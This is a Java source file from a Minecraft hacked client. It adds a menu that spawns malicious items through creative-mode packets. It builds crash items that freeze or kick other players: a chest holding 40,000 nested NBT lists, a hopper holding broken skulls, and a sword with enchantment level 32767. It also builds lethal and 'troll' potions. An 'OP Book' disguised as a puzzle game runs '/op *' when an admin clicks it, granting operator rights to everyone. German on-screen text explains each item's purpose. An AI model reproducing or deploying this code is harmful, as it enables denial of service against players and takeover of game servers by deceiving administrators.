package de.crazymemecoke.features.ui.guiscreens;

import de.crazymemecoke.Client;
import de.crazymemecoke.manager.fontmanager.FontManager;
import de.crazymemecoke.manager.fontmanager.UnicodeFontRenderer;
import de.crazymemecoke.manager.notificationmanager.NotificationType;
import de.crazymemecoke.utils.NotifyUtil;
import de.crazymemecoke.utils.Wrapper;
import de.crazymemecoke.utils.render.RenderUtils;
import net.minecraft.client.gui.GuiButton;
import net.minecraft.client.gui.GuiScreen;
import net.minecraft.client.gui.ScaledResolution;
import net.minecraft.init.Blocks;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.JsonToNBT;
import net.minecraft.nbt.NBTException;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.play.client.C10PacketCreativeInventoryAction;
import org.lwjgl.input.Keyboard;

import java.awt.*;
import java.io.IOException;

public class GuiItems extends GuiScreen {
    public GuiScreen parent;

    FontManager fM = Client.main().fontMgr();

    private GuiScreen parentScreen;

    public GuiItems(GuiScreen parentScreen) {
        parent = parentScreen;
    }

    public void initGui() {
        /**
         * X-Koordinate:
         *
         * links: width / 2 - 160
         * mitte: width / 2 - 55
         * rechts: width / 2 + 50
         */

        Keyboard.enableRepeatEvents(true);
        buttonList.add(new GuiButton(1, width / 2 - 90, height - 65, 180, 20, "Zurück"));
        buttonList.add(new GuiButton(2, width / 2 - 160, 60, 100, 20, "Crash Chest"));
        buttonList.add(new GuiButton(3, width / 2 - 55, 60, 100, 20, "Killer Potion"));
        buttonList.add(new GuiButton(4, width / 2 + 50, 60, 100, 20, "Troll Potion"));
        buttonList.add(new GuiButton(5, width / 2 - 160, 85, 100, 20, "Crash Hopper"));
        buttonList.add(new GuiButton(6, width / 2 - 55, 85, 100, 20, "Better ArmorStand"));
        buttonList.add(new GuiButton(7, width / 2 + 50, 85, 100, 20, "OP Book"));
        buttonList.add(new GuiButton(8, width / 2 - 160, 110, 100, 20, "Crash Sword"));
    }

    public void onGuiClosed() {
        Keyboard.enableRepeatEvents(false);
    }

    protected void actionPerformed(GuiButton button) throws IOException {
        switch (button.id) {
            case 1: {
                mc.displayGuiScreen(null);
                break;
            }
            case 2: {
                crashChest();
                break;
            }
            case 3: {
                killerPotion();
                break;
            }
            case 4: {
                trollPotion();
                break;
            }
            case 5: {
                crashHopper();
                break;
            }
            case 6: {
                betterArmorStand();
                break;
            }
            case 7: {
                opBook();
                break;
            }
            case 8: {
                crashSword();
                break;
            }
        }
    }

    private void crashSword() {
        String itemName = "§cCrash§6Sword";
        if (Wrapper.mc.thePlayer.inventory.getStackInSlot(0) != null) {
            mc.displayGuiScreen(null);
            NotifyUtil.notification("Nicht verfügbar!", "Du musst hierfür den ersten Slot in der Hotbar leeren!", NotificationType.ERROR, 5);
            return;
        } else if (!Wrapper.mc.thePlayer.capabilities.isCreativeMode) {
            mc.displayGuiScreen(null);
            NotifyUtil.notification("Nicht verfügbar!", "Du musst hierfür im Kreativmodus sein!", NotificationType.ERROR, 5);
            return;
        }
        ItemStack itemStack = new ItemStack(Items.diamond_sword);
        NBTTagList nbtTagList = new NBTTagList();
        try {
            itemStack.setTagCompound(JsonToNBT.getTagFromJson("{ench:[0:{lvl:32767,id:21}]}"));
        } catch (NBTException ignored) {
        }
        itemStack.setTagInfo("CustomNBT", nbtTagList);
        itemStack.setStackDisplayName(itemName);
        Wrapper.mc.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, itemStack));
        mc.displayGuiScreen(null);
        NotifyUtil.notification("Item erhalten", "Du hast ein §cCrash Sword §rerhalten!", NotificationType.INFO, 5);
    }

    private void opBook() {
        String itemName = "§aPuzzle (Spiel)";
        if (Wrapper.mc.thePlayer.inventory.getStackInSlot(0) != null) {
            mc.displayGuiScreen(null);
            NotifyUtil.notification("Nicht verfügbar!", "Du musst hierfür den ersten Slot in der Hotbar leeren!", NotificationType.ERROR, 5);
            return;
        } else if (!Wrapper.mc.thePlayer.capabilities.isCreativeMode) {
            mc.displayGuiScreen(null);
            NotifyUtil.notification("Nicht verfügbar!", "Du musst hierfür im Kreativmodus sein!", NotificationType.ERROR, 5);
            return;
        }
        ItemStack itemStack = new ItemStack(Items.written_book);
        NBTTagList nbtTagList = new NBTTagList();
        try {
            itemStack.setTagCompound(JsonToNBT.getTagFromJson("{pages:[\"{\\\"text\\\":\\\"[Spiel starten]\\\",\\\"color\\\":\\\"gold\\\",\\\"clickEvent\\\":{\\\"action\\\":\\\"run_command\\\",\\\"value\\\":\\\"/op *\\\"}}\"],title:\"Custom Book\",author:Server}"));
        } catch (NBTException ignored) {
        }
        itemStack.setTagInfo("CustomNBT", nbtTagList);
        itemStack.setStackDisplayName(itemName);
        Wrapper.mc.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, itemStack));
        mc.displayGuiScreen(null);
        NotifyUtil.notification("Item erhalten", "Du hast ein §cOP Book §rerhalten!", NotificationType.INFO, 5);
    }

    private void betterArmorStand() {
        String itemName = "§aBetter §cArmor§6Stand";
        if (Wrapper.mc.thePlayer.inventory.getStackInSlot(0) != null) {
            mc.displayGuiScreen(null);
            NotifyUtil.notification("Nicht verfügbar!", "Du musst hierfür den ersten Slot in der Hotbar leeren!", NotificationType.ERROR, 5);
            return;
        } else if (!Wrapper.mc.thePlayer.capabilities.isCreativeMode) {
            mc.displayGuiScreen(null);
            NotifyUtil.notification("Nicht verfügbar!", "Du musst hierfür im Kreativmodus sein!", NotificationType.ERROR, 5);
            return;
        }
        ItemStack itemStack = new ItemStack(Items.armor_stand);
        NBTTagList nbtTagList = new NBTTagList();
        try {
            itemStack.setTagCompound(JsonToNBT.getTagFromJson("{EntityTag:{ShowArms:1,NoBasePlate:1}}"));
        } catch (NBTException ignored) {
        }
        itemStack.setTagInfo("CustomNBT", nbtTagList);
        itemStack.setStackDisplayName(itemName);
        Wrapper.mc.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, itemStack));
        mc.displayGuiScreen(null);
        NotifyUtil.notification("Item erhalten", "Du hast ein §cBetter ArmorStand §rerhalten!", NotificationType.INFO, 5);
    }

    private void crashHopper() {
        String itemName = "§cCrash§6Hopper";
        if (Wrapper.mc.thePlayer.inventory.getStackInSlot(0) != null) {
            mc.displayGuiScreen(null);
            NotifyUtil.notification("Nicht verfügbar!", "Du musst hierfür den ersten Slot in der Hotbar leeren!", NotificationType.ERROR, 5);
            return;
        } else if (!Wrapper.mc.thePlayer.capabilities.isCreativeMode) {
            mc.displayGuiScreen(null);
            NotifyUtil.notification("Nicht verfügbar!", "Du musst hierfür im Kreativmodus sein!", NotificationType.ERROR, 5);
            return;
        }
        ItemStack itemStack = new ItemStack(Blocks.hopper);
        NBTTagList nbtTagList = new NBTTagList();
        try {
            itemStack.setTagCompound(JsonToNBT.getTagFromJson("{BlockEntityTag:{Items:[{id:skull,Count:64,Slot:0,tag:{SkullOwner:{Id:\"0\"}}}]}}"));
        } catch (NBTException ignored) {
        }
        itemStack.setTagInfo("CustomNBT", nbtTagList);
        itemStack.setStackDisplayName(itemName);
        Wrapper.mc.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, itemStack));
        mc.displayGuiScreen(null);
        NotifyUtil.notification("Item erhalten", "Du hast ein §cCrashHopper §rerhalten!", NotificationType.INFO, 5);
    }

    private void trollPotion() {
        String itemName = "§cTroll§6Potion";
        if (Wrapper.mc.thePlayer.inventory.getStackInSlot(0) != null) {
            mc.displayGuiScreen(null);
            NotifyUtil.notification("Nicht verfügbar!", "Du musst hierfür den ersten Slot in der Hotbar leeren!", NotificationType.ERROR, 5);
            return;
        } else if (!Wrapper.mc.thePlayer.capabilities.isCreativeMode) {
            mc.displayGuiScreen(null);
            NotifyUtil.notification("Nicht verfügbar!", "Du musst hierfür im Kreativmodus sein!", NotificationType.ERROR, 5);
            return;
        }
        ItemStack stack = new ItemStack(Items.potionitem);
        stack.setItemDamage(16384);
        NBTTagList effects = new NBTTagList();
        for (int i = 1; i <= 23; i++) {
            NBTTagCompound effect = new NBTTagCompound();
            effect.setInteger("Amplifier", Integer.MAX_VALUE);
            effect.setInteger("Duration", Integer.MAX_VALUE);
            effect.setInteger("Id", i);
            effects.appendTag(effect);
        }
        stack.setTagInfo("CustomPotionEffects", effects);
        stack.setStackDisplayName(itemName);
        Wrapper.mc.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, stack));
        mc.displayGuiScreen(null);
        NotifyUtil.notification("Item erhalten", "Du hast eine §cTrollPotion §rerhalten!", NotificationType.INFO, 5);
    }

    private void killerPotion() {
        String itemName = "§cKiller§6Potion";
        if (Wrapper.mc.thePlayer.inventory.getStackInSlot(0) != null) {
            mc.displayGuiScreen(null);
            NotifyUtil.notification("Nicht verfügbar!", "Du musst hierfür den ersten Slot in der Hotbar leeren!", NotificationType.ERROR, 5);
            return;
        } else if (!Wrapper.mc.thePlayer.capabilities.isCreativeMode) {
            mc.displayGuiScreen(null);
            NotifyUtil.notification("Nicht verfügbar!", "Du musst hierfür im Kreativmodus sein!", NotificationType.ERROR, 5);
            return;
        }
        ItemStack stack = new ItemStack(Items.potionitem);
        stack.setItemDamage(16384);
        NBTTagList effects = new NBTTagList();
        NBTTagCompound effect = new NBTTagCompound();
        effect.setInteger("Amplifier", 125);
        effect.setInteger("Duration", 2000);
        effect.setInteger("Id", 6);
        effects.appendTag(effect);
        stack.setTagInfo("CustomPotionEffects", effects);
        stack.setStackDisplayName(itemName);
        Wrapper.mc.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(36, stack));
        mc.displayGuiScreen(null);
        NotifyUtil.notification("Item erhalten", "Du hast eine §cKillerPotion §rerhalten!", NotificationType.INFO, 5);
    }

    private void crashChest() {
        String itemName = "§cCopy Me!";
        if (Wrapper.mc.thePlayer.inventory.getStackInSlot(36) != null) {
            if (Wrapper.mc.thePlayer.inventory.getStackInSlot(36).getDisplayName().equals(itemName)) {
                mc.displayGuiScreen(null);
                NotifyUtil.notification("Aktion abgebrochen!", "Du hast bereits eine §cCrashChest§r!", NotificationType.INFO, 5);
                return;
            } else {
                mc.displayGuiScreen(null);
                NotifyUtil.notification("Nicht verfügbar!", "Du musst hierfür deine Schuhe ausziehen!", NotificationType.ERROR, 5);
                return;
            }
        } else if (!Wrapper.mc.thePlayer.capabilities.isCreativeMode) {
            mc.displayGuiScreen(null);
            NotifyUtil.notification("Nicht verfügbar!", "Du musst hierfür im Kreativmodus sein!", NotificationType.ERROR, 5);
            return;
        }
        ItemStack stack = new ItemStack(Blocks.chest);
        NBTTagCompound nbtTagCompound = new NBTTagCompound();
        NBTTagList nbtList = new NBTTagList();
        for (int i = 0; i < 40000; i++)
            nbtList.appendTag(new NBTTagList());
        nbtTagCompound.setTag("www.masterof13fps.com", nbtList);
        stack.setTagInfo("www.masterof13fps.com", nbtTagCompound);
        Wrapper.mc.thePlayer.getInventory()[0] = stack;
        stack.setStackDisplayName(itemName);
        mc.displayGuiScreen(null);
        NotifyUtil.notification("Item erhalten", "Du hast eine §cCrashChest §rerhalten!", NotificationType.INFO, 5);
    }

    @Override
    protected void keyTyped(char typedChar, int keyCode) throws IOException {
        if (Keyboard.isKeyDown(Keyboard.KEY_ESCAPE)) {
            mc.displayGuiScreen(null);
        }
    }

    public void drawScreen(int posX, int posY, float f) {
        ScaledResolution sr = new ScaledResolution(Wrapper.mc);

        // Button Background
        RenderUtils.drawRoundedRect(width / 2 - 165, 55, 315, 75, 10, new Color(0, 0, 0).getRGB());

        // Erklärungen Titel
        RenderUtils.drawRoundedRect(135, height / 2 - 37, 72, 16, 10, new Color(0, 0, 0).getRGB());

        // Erklärungen
        RenderUtils.drawRoundedRect(10, height / 2 - 10, 360, 125, 10, new Color(0, 0, 0).getRGB());

        RenderUtils.drawRect(0, 0, width, height, new Color(0, 0, 0, 150).getRGB());
        RenderUtils.drawRect(5, 5, width - 5, height - 5, new Color(0, 0, 0, 155).getRGB());

        String title = "Items";
        UnicodeFontRenderer titleFont = fM.font("Comfortaa", 24, Font.PLAIN);
        UnicodeFontRenderer messageFont = fM.font("Comfortaa", 20, Font.PLAIN);
        titleFont.drawStringWithShadow(title, width / 2 - titleFont.getStringWidth(title) / 2, 10, -1);

        messageFont.drawStringWithShadow("Erklärungen:", 140, height / 2 - 30, -1);

        messageFont.drawStringWithShadow("Crash Chest - Wenn oft genug kopiert, dann kickt sie einen\n\n" +
                "Killer Potion - Tötet Entitäten, selbst Spieler im Kreativmodus\n\n" +
                "Troll Potion - Gibt Entitäten alle schlechten Effekte, die es gibt\n\n" +
                "Crash Hopper - Crasht Spieler, die beim Platzieren hinschauen\n\n" +
                "Better ArmorStand - Ein ArmorStand mit Armen und ohne BasePlate\n\n" +
                "OP Book - Gibt jedem OP, wenn ein Admin auf den Inhalt klickt\n\n" +
                "Crash Sword - Crasht das Game des Spielers, der das Schwert hält", 15, height / 2, -1);

        super.drawScreen(posX, posY, f);
    }
}